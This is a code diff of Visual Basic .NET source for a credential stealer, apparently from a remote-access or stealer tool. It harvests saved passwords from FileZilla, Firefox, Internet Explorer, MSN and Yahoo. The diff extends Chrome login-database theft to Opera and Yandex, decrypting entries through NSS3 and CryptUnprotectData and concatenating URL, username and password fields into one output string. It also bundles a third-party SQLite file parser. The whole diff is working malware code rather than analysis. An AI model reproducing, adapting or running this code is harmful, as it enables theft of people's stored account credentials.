@@ -6,7 +6,7 @@ Imports System.Data
 Imports System.Collections
 Imports System.Collections.Generic
 
-Public Class A
+Public Class Passwords
     Public Shared Function GT() As String
         OL = ""
         FileZilla()
@@ -19,13 +19,16 @@ Public Class A
         OL += Main.n.splitalt
         FireFox()
         OL += Main.n.splitalt
-        Chrome.Gchrome()
+        GetOpera()
+        Chromium.fetch(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Opera Software\Opera Stable\Login Data")
+        OL += Main.n.splitalt
+        Chromium.fetch(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Google\Chrome\User Data\Default\Login Data")
+        OL += Main.n.splitalt
+        Chromium.fetch(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Yandex\YandexBrowser\User Data\Default\Login Data")
         OL += Main.n.splitalt
         Msn()
         OL += Main.n.splitalt
         Yahoo()
-        OL += Main.n.splitalt
-        GetOpera()
         OL += Main.n.splitalt
         Dim r = New CIE7Passwords
         r.Refresh()
@@ -47,16 +50,16 @@ Module p
     Public OL As String
 
 #Region "MSN Password"
-    <DllImport("advapi32.dll", CharSet:=CharSet.Unicode, SetLastError:=True)> _
+    <DllImport("advapi32.dll", CharSet:=CharSet.Unicode, SetLastError:=True)>
     Public Function CredEnumerateW(ByVal filter As String, ByVal flag As UInt32, <Out()> ByRef count As UInt32, <Out()> ByRef pCredentials As IntPtr) As Boolean
     End Function
-    <StructLayout(LayoutKind.Sequential)> _
+    <StructLayout(LayoutKind.Sequential)>
     Friend Structure CREDENTIAL
         Public Flags As Integer
         Public Type As Integer
-        <MarshalAs(UnmanagedType.LPWStr)> _
+        <MarshalAs(UnmanagedType.LPWStr)>
         Public TargetName As String
-        <MarshalAs(UnmanagedType.LPWStr)> _
+        <MarshalAs(UnmanagedType.LPWStr)>
         Public Comment As String
         Public LastWritten As Long
         Public CredentialBlobSize As Integer
@@ -64,9 +67,9 @@ Module p
         Public Persist As Integer
         Public AttributeCount As Integer
         Public Attributes As IntPtr
-        <MarshalAs(UnmanagedType.LPWStr)> _
+        <MarshalAs(UnmanagedType.LPWStr)>
         Public TargetAlias As String
-        <MarshalAs(UnmanagedType.LPWStr)> _
+        <MarshalAs(UnmanagedType.LPWStr)>
         Public UserName As String
     End Structure
     Sub Msn()
@@ -78,7 +81,6 @@ Module p
                 Dim i As Integer
                 For i = 0 To num - 1
                     Try
-                        Dim s As String
                         OL += "|URL| http://hotmail.com" & vbNewLine
                         Dim credential As CREDENTIAL = DirectCast(Marshal.PtrToStructure(Marshal.ReadIntPtr(zero, (IntPtr.Size * i)), GetType(CREDENTIAL)), CREDENTIAL)
                         OL += "|USR| " & credential.UserName & vbNewLine
@@ -218,7 +220,7 @@ Module p
         End Try
     End Sub
 #Region "Opera"
-    Private opera_salt As Byte() = {&H83, &H7D, &HFC, &HF, &H8E, &HB3, _
+    Private opera_salt As Byte() = {&H83, &H7D, &HFC, &HF, &H8E, &HB3,
     &HE8, &H69, &H73, &HAF, &HFF}
     Private key_size As Byte() = {&H0, &H0, &H0, &H8}
     Private path As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
@@ -406,21 +408,21 @@ Module firefox5
         Public Shared cb As Long
         Public Shared abID As Byte()
     End Class
-    <StructLayout(LayoutKind.Sequential)> _
+    <StructLayout(LayoutKind.Sequential)>
     Public Structure TSECItem
         Public SECItemType As Integer
         Public SECItemData As Integer
         Public SECItemLen As Integer
     End Structure
 
-    <DllImport("kernel32.dll")> _
+    <DllImport("kernel32.dll")>
     Private Function LoadLibrary(ByVal dllFilePath As String) As IntPtr
     End Function
     Private NSS3 As IntPtr
-    <DllImport("kernel32", CharSet:=CharSet.Ansi, ExactSpelling:=True, SetLastError:=True)> _
+    <DllImport("kernel32", CharSet:=CharSet.Ansi, ExactSpelling:=True, SetLastError:=True)>
     Private Function GetProcAddress(ByVal hModule As IntPtr, ByVal procName As String) As IntPtr
     End Function
-    <UnmanagedFunctionPointer(CallingConvention.Cdecl)> _
+    <UnmanagedFunctionPointer(CallingConvention.Cdecl)>
     Public Delegate Function DLLFunctionDelegate(ByVal configdir As String) As Long
     Public Function NSS_Init(ByVal configdir As String) As Long
         Dim MozillaPath As String = Environment.GetEnvironmentVariable("PROGRAMFILES") & "\Mozilla Firefox\"
@@ -439,28 +441,28 @@ Module firefox5
         Dim dll As DLLFunctionDelegate = DirectCast(Marshal.GetDelegateForFunctionPointer(pProc, GetType(DLLFunctionDelegate)), DLLFunctionDelegate)
         Return dll(configdir)
     End Function
-    <UnmanagedFunctionPointer(CallingConvention.Cdecl)> _
+    <UnmanagedFunctionPointer(CallingConvention.Cdecl)>
     Public Delegate Function DLLFunctionDelegate2() As Long
     Public Function PK11_GetInternalKeySlot() As Long
         Dim pProc As IntPtr = GetProcAddress(NSS3, "PK11_GetInternalKeySlot")
         Dim dll As DLLFunctionDelegate2 = DirectCast(Marshal.GetDelegateForFunctionPointer(pProc, GetType(DLLFunctionDelegate2)), DLLFunctionDelegate2)
         Return dll()
     End Function
-    <UnmanagedFunctionPointer(CallingConvention.Cdecl)> _
+    <UnmanagedFunctionPointer(CallingConvention.Cdecl)>
     Public Delegate Function DLLFunctionDelegate3(ByVal slot As Long, ByVal loadCerts As Boolean, ByVal wincx As Long) As Long
     Public Function PK11_Authenticate(ByVal slot As Long, ByVal loadCerts As Boolean, ByVal wincx As Long) As Long
         Dim pProc As IntPtr = GetProcAddress(NSS3, "PK11_Authenticate")
         Dim dll As DLLFunctionDelegate3 = DirectCast(Marshal.GetDelegateForFunctionPointer(pProc, GetType(DLLFunctionDelegate3)), DLLFunctionDelegate3)
         Return dll(slot, loadCerts, wincx)
     End Function
-    <UnmanagedFunctionPointer(CallingConvention.Cdecl)> _
+    <UnmanagedFunctionPointer(CallingConvention.Cdecl)>
     Public Delegate Function DLLFunctionDelegate4(ByVal arenaOpt As IntPtr, ByVal outItemOpt As IntPtr, ByVal inStr As StringBuilder, ByVal inLen As Integer) As Integer
     Public Function NSSBase64_DecodeBuffer(ByVal arenaOpt As IntPtr, ByVal outItemOpt As IntPtr, ByVal inStr As StringBuilder, ByVal inLen As Integer) As Integer
         Dim pProc As IntPtr = GetProcAddress(NSS3, "NSSBase64_DecodeBuffer")
         Dim dll As DLLFunctionDelegate4 = DirectCast(Marshal.GetDelegateForFunctionPointer(pProc, GetType(DLLFunctionDelegate4)), DLLFunctionDelegate4)
         Return dll(arenaOpt, outItemOpt, inStr, inLen)
     End Function
-    <UnmanagedFunctionPointer(CallingConvention.Cdecl)> _
+    <UnmanagedFunctionPointer(CallingConvention.Cdecl)>
     Public Delegate Function DLLFunctionDelegate5(ByRef data As TSECItem, ByRef result As TSECItem, ByVal cx As Integer) As Integer
     Public Function PK11SDR_Decrypt(ByRef data As TSECItem, ByRef result As TSECItem, ByVal cx As Integer) As Integer
         Dim pProc As IntPtr = GetProcAddress(NSS3, "PK11SDR_Decrypt")
@@ -469,74 +471,74 @@ Module firefox5
     End Function
     Public signon As String
     Public Class SQLiteBase5
-        <DllImport("kernel32")> _
+        <DllImport("kernel32")>
         Private Shared Function HeapAlloc(ByVal heap As IntPtr, ByVal flags As UInt32, ByVal bytes As UInt32) As IntPtr
         End Function
 
-        <DllImport("kernel32")> _
+        <DllImport("kernel32")>
         Private Shared Function GetProcessHeap() As IntPtr
         End Function
 
-        <DllImport("kernel32")> _
+        <DllImport("kernel32")>
         Private Shared Function lstrlen(ByVal str As IntPtr) As Integer
         End Function
-        <DllImport("mozsqlite3")> _
+        <DllImport("mozsqlite3")>
         Private Shared Function sqlite3_open(ByVal fileName As IntPtr, ByRef database As IntPtr) As Integer
         End Function
 
-        <DllImport("mozsqlite3")> _
+        <DllImport("mozsqlite3")>
         Private Shared Function sqlite3_close(ByVal database As IntPtr) As Integer
         End Function
 
-        <DllImport("mozsqlite3")> _
+        <DllImport("mozsqlite3")>
         Private Shared Function sqlite3_exec(ByVal database As IntPtr, ByVal query As IntPtr, ByVal callback As IntPtr, ByVal arguments As IntPtr, ByRef [error] As IntPtr) As Integer
         End Function
 
-        <DllImport("mozsqlite3")> _
+        <DllImport("mozsqlite3")>
         Private Shared Function sqlite3_errmsg(ByVal database As IntPtr) As IntPtr
         End Function
 
-        <DllImport("mozsqlite3")> _
+        <DllImport("mozsqlite3")>
         Private Shared Function sqlite3_prepare_v2(ByVal database As IntPtr, ByVal query As IntPtr, ByVal length As Integer, ByRef statement As IntPtr, ByRef tail As IntPtr) As Integer
         End Function
 
-        <DllImport("mozsqlite3")> _
+        <DllImport("mozsqlite3")>
         Private Shared Function sqlite3_step(ByVal statement As IntPtr) As Integer
         End Function
 
-        <DllImport("mozsqlite3")> _
+        <DllImport("mozsqlite3")>
         Private Shared Function sqlite3_column_count(ByVal statement As IntPtr) As Integer
         End Function
 
-        <DllImport("mozsqlite3")> _
+        <DllImport("mozsqlite3")>
         Private Shared Function sqlite3_column_name(ByVal statement As IntPtr, ByVal columnNumber As Integer) As IntPtr
         End Function
 
-        <DllImport("mozsqlite3")> _
+        <DllImport("mozsqlite3")>
         Private Shared Function sqlite3_column_type(ByVal statement As IntPtr, ByVal columnNumber As Integer) As Integer
         End Function
 
-        <DllImport("mozsqlite3")> _
+        <DllImport("mozsqlite3")>
         Private Shared Function sqlite3_column_int(ByVal statement As IntPtr, ByVal columnNumber As Integer) As Integer
         End Function
 
-        <DllImport("mozsqlite3")> _
+        <DllImport("mozsqlite3")>
         Private Shared Function sqlite3_column_double(ByVal statement As IntPtr, ByVal columnNumber As Integer) As Double
         End Function
 
-        <DllImport("mozsqlite3")> _
+        <DllImport("mozsqlite3")>
         Private Shared Function sqlite3_column_text(ByVal statement As IntPtr, ByVal columnNumber As Integer) As IntPtr
         End Function
 
-        <DllImport("mozsqlite3")> _
+        <DllImport("mozsqlite3")>
         Private Shared Function sqlite3_column_blob(ByVal statement As IntPtr, ByVal columnNumber As Integer) As IntPtr
         End Function
 
-        <DllImport("mozsqlite3")> _
+        <DllImport("mozsqlite3")>
         Private Shared Function sqlite3_column_table_name(ByVal statement As IntPtr, ByVal columnNumber As Integer) As IntPtr
         End Function
 
-        <DllImport("mozsqlite3")> _
+        <DllImport("mozsqlite3")>
         Private Shared Function sqlite3_finalize(ByVal handle As IntPtr) As Integer
         End Function
 
@@ -719,14 +721,12 @@ Module firefox5
     End Class
 End Module
 #End Region
-#Region "Chrome"
-Module Chrome
+#Region "Chromium"
+Module Chromium
 
-
-    Sub Gchrome()
-        '  OL += vbNewLine & "###Chrome" & vbNewLine
+    ''For chromium browsers
+    Sub fetch(ByVal datapath As String)
         Try
-            Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Google\Chrome\User Data\Default\Login Data"
             Dim SQLDatabase = New SQLiteHandler(datapath)
             SQLDatabase.ReadTable("logins")
             If File.Exists(datapath) Then
@@ -737,7 +737,6 @@ Module Chrome
                     pass = Decrypt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))
                     If (user <> "") And (pass <> "") Then
                         OL += "|URL| " & host & vbNewLine & "|USR| " & user & vbNewLine & "|PWD| " & pass & vbNewLine
-
                     End If
                 Next
             End If
@@ -745,7 +744,7 @@ Module Chrome
         End Try
 
     End Sub
-    <DllImport("Crypt32.dll", SetLastError:=True, CharSet:=System.Runtime.InteropServices.CharSet.Auto)> _
+    <DllImport("Crypt32.dll", SetLastError:=True, CharSet:=System.Runtime.InteropServices.CharSet.Auto)>
     Private Function CryptUnprotectData(ByRef pDataIn As DATA_BLOB, ByVal szDataDescr As String, ByRef pOptionalEntropy As DATA_BLOB, ByVal pvReserved As IntPtr, ByRef pPromptStruct As CRYPTPROTECT_PROMPTSTRUCT, ByVal dwFlags As Integer, ByRef pDataOut As DATA_BLOB) As Boolean
     End Function
     <Flags()> Enum CryptProtectPromptFlags
@@ -776,7 +775,43 @@ Module Chrome
     End Function
 
 End Module
+
 Public Class SQLiteHandler
+
+    '**************************************************************
+    '
+    '               Coded By: RockingWithTheBest
+    '
+    '                           v 0.1
+    '
+    '
+    '      A Handler for SQLite without needing the sqlite3.dll!
+    '      You can read every table and value from database, but
+    '      there is no support for input. Also no support for
+    '      journal files and overflow pages, maybe i will add
+    '      that in a later release.
+    '      
+    '
+    '                       Have Fun!
+    '
+    '   If u want to learn more about or enhance it then visit:
+    '           http://www.sqlite.org/fileformat.html
+    '
+    '   If you copy or modify it, please add me to credits!
+    '
+    '   Questions etc. to:      peterrlustig@googlemail.com
+    '
+    '**************************************************************
+    '
+    '   Example:
+    '
+    '   Dim SQLDatabase = New SQLiteHandler("C:\Temp\Login Data")
+    '   SQLDatabase.ReadTable("logins")
+    '
+    '   MsgBox(GetValue(SQLDatabase.GetValue(0, "username_value")))
+    '
+    '**************************************************************
+
     Private db_bytes() As Byte
     Private page_size As UInt16
     Private encoding As UInt64
@@ -804,18 +839,6 @@ Public Class SQLiteHandler
         Dim root_num As Int64
         Dim sql_statement As String
     End Structure
-
-    Private Function ToBigEndian16Bit(ByVal value As UInt16) As UInt16
-        Return ((value And &HFF) << 8 Or (value And &HFF00) >> 8)
-    End Function
-
-    Private Function ToBigEndian32Bit(ByVal value As UInt32) As UInt32
-        Return (value And &HFF) << 24 Or (value And &HFF00) << 8 Or (value And &HFF0000) >> 8 Or (value And &HFF000000) >> 24
-    End Function
-
-    Private Function ToBigEndian64Bit(ByVal value As UInt64) As UInt64
-        Return (value And &HFFL) << 56 Or (value And &HFF00L) << 40 Or (value And &HFF0000L) << 24 Or (value And &HFF000000L) << 8 Or (value And &HFF00000000L) >> 8 Or (value And &HFF0000000000L) >> 24 Or (value And &HFF000000000000L) >> 40 Or (value And &HFF00000000000000L) >> 56
-    End Function
 
     'Needs BigEndian
     'GetVariableLength
@@ -850,7 +873,7 @@ Public Class SQLiteHandler
         End If
 
         If Length = 9 Then
-            ' Ein Byte wird n?mlich grad hinzugefügt
+            ' Ein Byte wird nämlich grad hinzugefügt
             Bit64 = True
         End If
 
@@ -900,12 +923,12 @@ Public Class SQLiteHandler
 
         If db_bytes(Offset) = &HD Then 'Leaf node
             'Length for setting the array length for the entries
-            Dim Length As UInt16 = ToBigEndian16Bit(BitConverter.ToUInt16(db_bytes, Offset + 3)) - 1
+            Dim Length As UInt16 = ConvertToInteger(Offset + 3, 2) - 1
             Dim ol As Integer = 0
 
             If Not master_table_entries Is Nothing Then
-                ol = (master_table_entries.Length - 1)
-                ReDim Preserve master_table_entries((master_table_entries.Length - 1) + Length)
+                ol = master_table_entries.Length
+                ReDim Preserve master_table_entries(master_table_entries.Length + Length)
             Else
                 ReDim master_table_entries(Length)
             End If
@@ -913,7 +936,7 @@ Public Class SQLiteHandler
             Dim ent_offset As UInt64
 
             For i = 0 To Length Step 1
-                ent_offset = ToBigEndian16Bit(BitConverter.ToUInt16(db_bytes, Offset + 8 + (i * 2)))
+                ent_offset = ConvertToInteger(Offset + 8 + (i * 2), 2)
 
                 If Offset <> 100 Then ent_offset = ent_offset + Offset
 
@@ -978,11 +1001,11 @@ Public Class SQLiteHandler
                 End If
             Next
         ElseIf db_bytes(Offset) = &H5 Then 'internal node
-            Dim Length As UInt16 = ToBigEndian16Bit(BitConverter.ToUInt16(db_bytes, Offset + 3)) - 1
+            Dim Length As UInt16 = ConvertToInteger(Offset + 3, 2) - 1
             Dim ent_offset As UInt16
 
             For i = 0 To Length Step 1
-                ent_offset = ToBigEndian16Bit(BitConverter.ToUInt16(db_bytes, Offset + 12 + (i * 2)))
+                ent_offset = ConvertToInteger(Offset + 12 + (i * 2), 2)
 
                 If Offset = 100 Then
                     ReadMasterTable((ConvertToInteger(ent_offset, 4) - 1) * page_size)
@@ -998,13 +1021,14 @@ Public Class SQLiteHandler
 
     Private Function ReadTableFromOffset(ByVal Offset As UInt64) As Boolean
         If db_bytes(Offset) = &HD Then 'Leaf node
+
             'Length for setting the array length for the entries
-            Dim Length As UInt16 = ToBigEndian16Bit(BitConverter.ToUInt16(db_bytes, Offset + 3)) - 1
+            Dim Length As UInt16 = ConvertToInteger(Offset + 3, 2) - 1
             Dim ol As Integer = 0
 
             If Not table_entries Is Nothing Then
-                ol = table_entries.Length - 1
-                ReDim Preserve table_entries((table_entries.Length - 1) + Length)
+                ol = table_entries.Length
+                ReDim Preserve table_entries(table_entries.Length + Length)
             Else
                 ReDim table_entries(Length)
             End If
@@ -1012,7 +1036,7 @@ Public Class SQLiteHandler
             Dim ent_offset As UInt64
 
             For i = 0 To Length Step 1
-                ent_offset = ToBigEndian16Bit(BitConverter.ToUInt16(db_bytes, Offset + 8 + (i * 2)))
+                ent_offset = ConvertToInteger(Offset + 8 + (i * 2), 2)
 
                 If Offset <> 100 Then ent_offset = ent_offset + Offset
 
@@ -1082,11 +1106,11 @@ Public Class SQLiteHandler
                 Next
             Next
         ElseIf db_bytes(Offset) = &H5 Then 'internal node
-            Dim Length As UInt16 = ToBigEndian16Bit(BitConverter.ToUInt16(db_bytes, Offset + 3)) - 1
+            Dim Length As UInt16 = ConvertToInteger(Offset + 3, 2) - 1
             Dim ent_offset As UInt16
 
             For i = 0 To Length Step 1
-                ent_offset = ToBigEndian16Bit(BitConverter.ToUInt16(db_bytes, Offset + 12 + (i * 2)))
+                ent_offset = ConvertToInteger(Offset + 12 + (i * 2), 2)
 
                 ReadTableFromOffset((ConvertToInteger(Offset + ent_offset, 4) - 1) * page_size)
             Next
@@ -1172,6 +1196,7 @@ Public Class SQLiteHandler
                 arr = arr + 1
             End If
         Next
+
         Return retVal
     End Function
 
@@ -1187,16 +1212,15 @@ Public Class SQLiteHandler
             db_bytes = System.Text.Encoding.Default.GetBytes(asi)
 
             If System.Text.Encoding.Default.GetString(db_bytes, 0, 15).CompareTo("SQLite format 3") <> 0 Then
-                '   Throw New Exception("Not a valid SQLite 3 Database File")
-                Exit Sub
+                Throw New Exception("Not a valid SQLite 3 Database File")
+                End
             End If
 
             If db_bytes(52) <> 0 Then
-                '  Throw New Exception("Auto-vacuum capable database is not supported")
-                Exit Sub
-            ElseIf ToBigEndian32Bit(BitConverter.ToInt32(db_bytes, 44)) >= 4 Then
-                '  Throw New Exception("No supported Schema layer file-format")
-                Exit Sub
+                Throw New Exception("Auto-vacuum capable database is not supported")
+                End
+            ElseIf ConvertToInteger(44, 4) >= 4 Then
+
             End If
 
             page_size = ConvertToInteger(16, 2)
